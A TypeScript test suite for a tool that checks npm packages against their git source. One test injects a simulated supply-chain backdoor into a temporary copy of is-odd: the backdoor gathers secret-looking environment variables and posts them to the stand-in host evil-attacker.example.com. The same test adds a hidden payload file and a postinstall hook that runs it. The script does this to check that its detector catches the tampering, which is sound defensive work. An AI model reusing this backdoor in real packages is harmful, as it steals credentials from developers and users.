/**
 * Test script for Registry Integrity Feature
 * 
 * Tests both healthy and simulated attack scenarios:
 * 1. Healthy: is-odd@3.0.1 - a tiny package where npm = git
 * 2. Simulated Attack: Add malicious file that exists in both dirs - should fail
 * 3. Injection path classification: real logic still FAILs on xy/injection-style paths
 * 
 * Run with: npx tsx src/test-registry-integrity.ts
 */

import * as pacote from 'pacote';
import * as dircompare from 'dir-compare';
import simpleGit from 'simple-git';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { classifyOnlyInNpmPath, REASON_ONLY_IN_NPM, REASON_ONLY_IN_NPM_BUILD_ARTIFACT } from './registry-integrity';

// Files and directories to ignore during comparison (same as registry-integrity.ts)
const IGNORE_PATTERNS = [
    '.git',
    '.gitignore',
    '.npmignore',
    '.npmrc',
    'package-lock.json',
    'yarn.lock',
    'pnpm-lock.yaml',
    'node_modules',
    'dist',
    'build',
    '.DS_Store',
    'Thumbs.db',
    '.github',
    '.circleci',
    '.travis.yml',
    'CHANGELOG.md',
    'CHANGELOG',
    'HISTORY.md',
    'CHANGES.md',
];

interface TestResult {
    testName: string;
    status: 'pass' | 'warning' | 'fail';
    modifiedFiles: Array<{ path: string; reason: string }>;
    tagUsed: string | null;
    npmFilesCount: number;
    gitFilesCount: number;
    error?: string;
    expected: 'pass' | 'warning' | 'fail';
    testPassed: boolean;
    notes?: string;
}

/**
 * Compare two directories and return list of modified files
 */
async function compareDirectories(
    npmDir: string,
    gitDir: string
): Promise<Array<{ path: string; reason: string }>> {
    const modifiedFiles: Array<{ path: string; reason: string }> = [];

    try {
        const options: dircompare.Options = {
            compareContent: true,
            compareSize: true,
            excludeFilter: IGNORE_PATTERNS.join(','),
        };

        const result = await dircompare.compare(npmDir, gitDir, options);

        for (const diff of result.diffSet || []) {
            // We care about files that:
            // 1. Exist in BOTH directories but have different content
            // 2. Exist ONLY in npm (injected/added files)
            if (diff.type1 === 'file') {
                const relativePath = diff.relativePath ?
                    path.join(diff.relativePath, diff.name1 || '') :
                    (diff.name1 || '');

                // Skip ignored patterns
                const normalizedPath = relativePath.replace(/\\/g, '/').toLowerCase();
                let shouldIgnore = false;
                for (const pattern of IGNORE_PATTERNS) {
                    if (normalizedPath.includes(pattern.toLowerCase())) {
                        shouldIgnore = true;
                        break;
                    }
                }
                if (shouldIgnore) continue;

                if (diff.state === 'distinct' && diff.type2 === 'file') {
                    modifiedFiles.push({
                        path: relativePath,
                        reason: 'Content differs between npm tarball and git source',
                    });
                } else if (diff.state === 'left' && !diff.type2) {
                    // File only exists in npm (left = npm), not in git
                    modifiedFiles.push({
                        path: relativePath,
                        reason: 'File exists in npm tarball but NOT in git source (SUSPICIOUS!)',
                    });
                }
            }
        }
    } catch (error: any) {
        console.warn(`⚠️ Directory comparison error:`, error.message);
    }

    return modifiedFiles;
}

/**
 * Count files in a directory recursively
 */
function countFiles(dir: string): number {
    if (!fs.existsSync(dir)) return 0;

    let count = 0;
    const items = fs.readdirSync(dir);

    for (const item of items) {
        const fullPath = path.join(dir, item);
        const stat = fs.statSync(fullPath);

        if (stat.isDirectory()) {
            if (!IGNORE_PATTERNS.includes(item)) {
                count += countFiles(fullPath);
            }
        } else {
            count++;
        }
    }

    return count;
}

/**
 * Clean up temporary directory
 */
function cleanupTempDir(tmpDir: string): void {
    try {
        if (fs.existsSync(tmpDir)) {
            fs.rmSync(tmpDir, { recursive: true, force: true });
        }
    } catch (error) {
        console.warn(`Failed to cleanup temp directory ${tmpDir}:`, error);
    }
}

/**
 * Test 1: Healthy Package Test
 * Tests is-odd@3.0.1 - a tiny, simple package where npm should match git
 */
async function runHealthyTest(): Promise<TestResult> {
    const packageName = 'is-odd';
    const version = '3.0.1';
    const repoUrl = 'https://github.com/jonschlinkert/is-odd';

    console.log('\n' + '='.repeat(60));
    console.log('🧪 TEST 1: HEALTHY PACKAGE TEST');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log(`📂 Repository: ${repoUrl}`);
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-healthy-${safeName}-${timestamp}-${random}`);
    const npmDir = path.join(tmpDir, 'npm');
    const gitDir = path.join(tmpDir, 'git');

    try {
        // Step 1: Download npm tarball
        console.log('📦 Step 1: Downloading npm tarball...');
        fs.mkdirSync(npmDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, npmDir);
        console.log(`✅ npm tarball extracted to ${npmDir}`);

        // List files in npm directory
        console.log('\n📁 Files in npm tarball:');
        const npmFiles = fs.readdirSync(npmDir);
        npmFiles.forEach(f => console.log(`   - ${f}`));

        // Step 2: Clone git repository
        console.log('\n📂 Step 2: Cloning git repository...');
        fs.mkdirSync(gitDir, { recursive: true });

        const git = simpleGit();
        const tagFormats = [`${version}`, `v${version}`];
        let tagUsed: string | null = null;

        for (const tag of tagFormats) {
            try {
                console.log(`🏷️ Trying to clone tag: ${tag}...`);
                await git.clone(repoUrl + '.git', gitDir, [
                    '--depth', '1',
                    '--branch', tag,
                    '--single-branch',
                ]);
                tagUsed = tag;
                console.log(`✅ Cloned tag ${tag} successfully`);
                break;
            } catch (e: any) {
                console.log(`⚠️ Tag ${tag} not found, trying next...`);
                if (fs.existsSync(gitDir)) {
                    fs.rmSync(gitDir, { recursive: true, force: true });
                    fs.mkdirSync(gitDir, { recursive: true });
                }
            }
        }

        if (!tagUsed) {
            return {
                testName: 'Healthy Package Test (is-odd)',
                status: 'warning',
                modifiedFiles: [],
                tagUsed: null,
                npmFilesCount: countFiles(npmDir),
                gitFilesCount: 0,
                error: `Could not find version tag matching ${version}`,
                expected: 'pass',
                testPassed: false,
                notes: 'Could not clone git repository - no matching tag found',
            };
        }

        // List files in git directory
        console.log('\n📁 Files in git repo:');
        const gitFiles = fs.readdirSync(gitDir);
        gitFiles.forEach(f => console.log(`   - ${f}`));

        // Step 3: Compare directories
        console.log('\n🔄 Step 3: Comparing npm tarball vs git source...');
        const modifiedFiles = await compareDirectories(npmDir, gitDir);

        // Determine status
        let status: 'pass' | 'warning' | 'fail' = 'pass';

        // Filter out expected differences (package.json minimal differences are ok)
        const criticalModified = modifiedFiles.filter(f => {
            // Critical: JS/TS source files with actual differences
            return (f.path.endsWith('.js') || f.path.endsWith('.ts')) &&
                !f.path.includes('test') && !f.path.includes('spec');
        });

        if (criticalModified.length > 0) {
            status = 'fail';
        } else if (modifiedFiles.length > 0) {
            status = 'warning';
        }

        const npmFilesCount = countFiles(npmDir);
        const gitFilesCount = countFiles(gitDir);

        return {
            testName: 'Healthy Package Test (is-odd)',
            status,
            modifiedFiles,
            tagUsed,
            npmFilesCount,
            gitFilesCount,
            expected: 'pass',
            // For healthy test, pass or warning is acceptable
            testPassed: status === 'pass' || status === 'warning',
            notes: status === 'warning'
                ? 'Minor non-critical differences detected (expected for npm publishing)'
                : status === 'pass' ? '✨ Perfect match between npm and git!' : undefined,
        };
    } catch (error: any) {
        return {
            testName: 'Healthy Package Test (is-odd)',
            status: 'fail',
            modifiedFiles: [],
            tagUsed: null,
            npmFilesCount: 0,
            gitFilesCount: 0,
            error: error.message,
            expected: 'pass',
            testPassed: false,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Test 2: Simulated Attack Test (Red Team)
 * Uses is-odd and injects malicious code
 */
async function runSimulatedAttackTest(): Promise<TestResult> {
    const packageName = 'is-odd';
    const version = '3.0.1';
    const repoUrl = 'https://github.com/jonschlinkert/is-odd';

    console.log('\n' + '='.repeat(60));
    console.log('🚨 TEST 2: SIMULATED ATTACK TEST (RED TEAM)');
    console.log('='.repeat(60));
    console.log(`📦 Package: ${packageName}@${version}`);
    console.log(`📂 Repository: ${repoUrl}`);
    console.log('⚠️ Will inject malicious code before comparison');
    console.log('');

    const safeName = packageName.replace(/[^a-zA-Z0-9-_]/g, '-');
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const tmpDir = path.join(os.tmpdir(), `test-attack-${safeName}-${timestamp}-${random}`);
    const npmDir = path.join(tmpDir, 'npm');
    const gitDir = path.join(tmpDir, 'git');

    try {
        // Step 1: Download npm tarball
        console.log('📦 Step 1: Downloading npm tarball...');
        fs.mkdirSync(npmDir, { recursive: true });
        await pacote.extract(`${packageName}@${version}`, npmDir);
        console.log(`✅ npm tarball extracted to ${npmDir}`);

        // Step 2: Clone git repository
        console.log('📂 Step 2: Cloning git repository...');
        fs.mkdirSync(gitDir, { recursive: true });

        const git = simpleGit();
        const tagFormats = [`${version}`, `v${version}`];
        let tagUsed: string | null = null;

        for (const tag of tagFormats) {
            try {
                console.log(`🏷️ Trying to clone tag: ${tag}...`);
                await git.clone(repoUrl + '.git', gitDir, [
                    '--depth', '1',
                    '--branch', tag,
                    '--single-branch',
                ]);
                tagUsed = tag;
                console.log(`✅ Cloned tag ${tag} successfully`);
                break;
            } catch (e: any) {
                console.log(`⚠️ Tag ${tag} not found, trying next...`);
                if (fs.existsSync(gitDir)) {
                    fs.rmSync(gitDir, { recursive: true, force: true });
                    fs.mkdirSync(gitDir, { recursive: true });
                }
            }
        }

        if (!tagUsed) {
            return {
                testName: 'Simulated Attack Test',
                status: 'warning',
                modifiedFiles: [],
                tagUsed: null,
                npmFilesCount: countFiles(npmDir),
                gitFilesCount: 0,
                error: `Could not find version tag matching ${version}`,
                expected: 'fail',
                testPassed: false,
            };
        }

        // 🚨 Step 3: INJECT MALICIOUS CODE (Red Team Simulation)
        console.log('');
        console.log('🚨🚨🚨 INJECTING MALICIOUS CODE 🚨🚨🚨');
        console.log('');

        // Modify the main index.js file (is-odd has index.js)
        const indexJsPath = path.join(npmDir, 'index.js');
        if (fs.existsSync(indexJsPath)) {
            console.log(`💉 Modifying existing file: index.js`);
            const originalContent = fs.readFileSync(indexJsPath, 'utf-8');
            const backdoor = `
// ==== MALICIOUS BACKDOOR START ====
// This simulates a supply chain attack (like event-stream@3.3.6)
const crypto = require('crypto');
const https = require('https');

// Steal environment variables
const secrets = Object.entries(process.env)
  .filter(([k]) => /key|secret|token|password|api/i.test(k))
  .reduce((acc, [k, v]) => ({ ...acc, [k]: v }), {});

// Exfiltrate to attacker
if (Object.keys(secrets).length > 0) {
  const data = JSON.stringify(secrets);
  const req = https.request({
    hostname: 'evil-attacker.example.com',
    port: 443,
    path: '/steal',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(data);
  req.end();
}
// ==== MALICIOUS BACKDOOR END ====

`;
            fs.writeFileSync(indexJsPath, backdoor + originalContent);
            console.log('✅ Backdoor injected into index.js!');
        } else {
            console.log('⚠️ index.js not found, creating malicious file instead');
        }

        // Also create a hidden malicious file
        const maliciousFilePath = path.join(npmDir, '.hidden-payload.js');
        const maliciousPayload = `// Hidden malicious payload
module.exports = function steal() {
  // Simulate data exfiltration
  return process.env;
};`;
        fs.writeFileSync(maliciousFilePath, maliciousPayload);
        console.log(`💉 Created hidden malicious file: .hidden-payload.js`);

        // Inject postinstall script
        const pkgJsonPath = path.join(npmDir, 'package.json');
        const pkgJson = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf-8'));
        console.log('💉 Injecting dangerous postinstall script...');
        pkgJson.scripts = pkgJson.scripts || {};
        pkgJson.scripts.postinstall = 'node ./.hidden-payload.js';
        fs.writeFileSync(pkgJsonPath, JSON.stringify(pkgJson, null, 2));
        console.log('✅ Dangerous postinstall script injected!');

        console.log('');
        console.log('🚨🚨🚨 INJECTION COMPLETE 🚨🚨🚨');
        console.log('');

        // Step 4: Compare directories
        console.log('🔄 Step 4: Comparing npm tarball vs git source...');
        const modifiedFiles = await compareDirectories(npmDir, gitDir);

        // Check for our injected malicious modifications
        const foundInjectedCode = modifiedFiles.some(f =>
            f.path.includes('index.js') ||
            f.path.includes('.hidden-payload.js') ||
            f.reason.includes('SUSPICIOUS')
        );

        // Determine status
        let status: 'pass' | 'warning' | 'fail' = 'pass';
        if (modifiedFiles.length > 0) {
            const criticalModified = modifiedFiles.some(f =>
                f.path.endsWith('.js') ||
                f.path.endsWith('.ts') ||
                f.reason.includes('SUSPICIOUS')
            );
            status = criticalModified ? 'fail' : 'warning';
        }

        const npmFilesCount = countFiles(npmDir);
        const gitFilesCount = countFiles(gitDir);

        return {
            testName: 'Simulated Attack Test',
            status,
            modifiedFiles,
            tagUsed,
            npmFilesCount,
            gitFilesCount,
            expected: 'fail',
            testPassed: status === 'fail' && foundInjectedCode,
            notes: foundInjectedCode
                ? '🎯 Successfully detected injected malicious code!'
                : '❌ Failed to detect injected malicious code',
        };
    } catch (error: any) {
        return {
            testName: 'Simulated Attack Test',
            status: 'fail',
            modifiedFiles: [],
            tagUsed: null,
            npmFilesCount: 0,
            gitFilesCount: 0,
            error: error.message,
            expected: 'fail',
            testPassed: false,
        };
    } finally {
        cleanupTempDir(tmpDir);
    }
}

/**
 * Test 3: Injection path classification (uses real registry-integrity logic)
 * Ensures we still FAIL on injection-style "only in npm" paths (e.g. event-stream / xy attacks).
 */
function runInjectionPathClassificationTest(): { testPassed: boolean; notes: string } {
    console.log('\n' + '='.repeat(60));
    console.log('🧪 TEST 3: INJECTION PATH CLASSIFICATION');
    console.log('='.repeat(60));
    console.log('Using real classifyOnlyInNpmPath() – injection paths must still → FAIL');
    console.log('');

    const suspiciousPaths = [
        '.hidden-payload.js',
        'evil.js',
        'src/backdoor.js',
        'node_modules/evil-package/index.js',
        '\\malicious.js',
    ];
    const buildArtifactPaths = [
        'cjs/react-compiler-runtime.production.js',
        'cjs/react.development.js',
        'umd/bundle.min.js',
        'index.js',
        'jsx-runtime.js',
        'LICENSE',
        'README.md',
    ];

    let allCorrect = true;
    for (const p of suspiciousPaths) {
        const reason = classifyOnlyInNpmPath(p);
        const ok = reason === REASON_ONLY_IN_NPM;
        if (!ok) allCorrect = false;
        console.log(`  ${ok ? '✅' : '❌'} ${p} → ${reason === REASON_ONLY_IN_NPM ? 'FAIL (suspicious)' : reason}`);
    }
    console.log('');
    for (const p of buildArtifactPaths) {
        const reason = classifyOnlyInNpmPath(p);
        const ok = reason === REASON_ONLY_IN_NPM_BUILD_ARTIFACT;
        if (!ok) allCorrect = false;
        console.log(`  ${ok ? '✅' : '❌'} ${p} → ${reason === REASON_ONLY_IN_NPM_BUILD_ARTIFACT ? 'WARNING (build artifact)' : reason}`);
    }

    const testPassed = allCorrect;
    const notes = testPassed
        ? 'Injection-style paths still cause FAIL; build-artifact paths only WARNING.'
        : 'Some paths were misclassified!';
    console.log('\n' + (testPassed ? '✅ TEST PASSED!' : '❌ TEST FAILED!') + ' ' + notes);
    return { testPassed, notes };
}

/**
 * Print test result
 */
function printResult(result: TestResult): void {
    console.log('\n' + '-'.repeat(60));
    console.log(`📋 RESULT: ${result.testName}`);
    console.log('-'.repeat(60));

    const statusEmoji = result.status === 'pass' ? '🟢' : result.status === 'warning' ? '🟡' : '🔴';
    console.log(`Status: ${statusEmoji} ${result.status.toUpperCase()}`);
    console.log(`Tag Used: ${result.tagUsed || 'N/A'}`);
    console.log(`NPM Files: ${result.npmFilesCount}`);
    console.log(`Git Files: ${result.gitFilesCount}`);
    console.log(`Modified Files: ${result.modifiedFiles.length}`);

    if (result.modifiedFiles.length > 0) {
        console.log('\nModified/Suspicious Files:');
        for (const file of result.modifiedFiles.slice(0, 10)) {
            const isSuspicious = file.reason.includes('SUSPICIOUS');
            const emoji = isSuspicious ? '🚨' : '📄';
            console.log(`  ${emoji} ${file.path}`);
            console.log(`      ${file.reason}`);
        }
        if (result.modifiedFiles.length > 10) {
            console.log(`  ... and ${result.modifiedFiles.length - 10} more files`);
        }
    }

    if (result.notes) {
        console.log(`\n📝 Notes: ${result.notes}`);
    }

    if (result.error) {
        console.log(`\n❌ Error: ${result.error}`);
    }

    console.log('');
    console.log(`Expected: ${result.expected.toUpperCase()}`);
    console.log(`Actual: ${result.status.toUpperCase()}`);

    if (result.testPassed) {
        console.log(`\n✅ TEST PASSED!`);
    } else {
        console.log(`\n❌ TEST FAILED!`);
    }
}

/**
 * Main test runner
 */
async function runTests(): Promise<void> {
    console.log('\n' + '='.repeat(60));
    console.log('🔬 REGISTRY INTEGRITY FEATURE TEST SUITE');
    console.log('='.repeat(60));
    console.log('Testing the Watchtower Registry Integrity Check feature');
    console.log('This simulates both healthy and compromised packages');
    console.log('');

    const results: TestResult[] = [];

    // Run Test 1: Healthy Package
    const healthyResult = await runHealthyTest();
    printResult(healthyResult);
    results.push(healthyResult);

    // Run Test 2: Simulated Attack
    const attackResult = await runSimulatedAttackTest();
    printResult(attackResult);
    results.push(attackResult);

    // Run Test 3: Injection path classification (real logic still fails on malicious paths)
    const classificationResult = runInjectionPathClassificationTest();
    results.push({
        testName: 'Injection path classification',
        status: classificationResult.testPassed ? 'pass' : 'fail',
        modifiedFiles: [],
        tagUsed: null,
        npmFilesCount: 0,
        gitFilesCount: 0,
        expected: 'pass',
        testPassed: classificationResult.testPassed,
        notes: classificationResult.notes,
    });

    // Final Summary
    console.log('\n' + '='.repeat(60));
    console.log('📊 FINAL TEST SUMMARY');
    console.log('='.repeat(60));

    let allPassed = true;
    for (const result of results) {
        const emoji = result.testPassed ? '✅' : '❌';
        console.log(`${emoji} ${result.testName}: ${result.testPassed ? 'PASSED' : 'FAILED'}`);
        if (result.notes) {
            console.log(`   📝 ${result.notes}`);
        }
        if (!result.testPassed) allPassed = false;
    }

    console.log('');
    if (allPassed) {
        console.log('🎉 ALL TESTS PASSED! Registry integrity feature is working correctly.');
        console.log('');
        console.log('✅ Healthy packages show pass/warning status');
        console.log('✅ Malicious code injection is detected as FAIL status');
    } else {
        console.log('⚠️ SOME TESTS FAILED. Please review the results above.');
    }
    console.log('');
}

// Run the tests
runTests().catch(console.error);
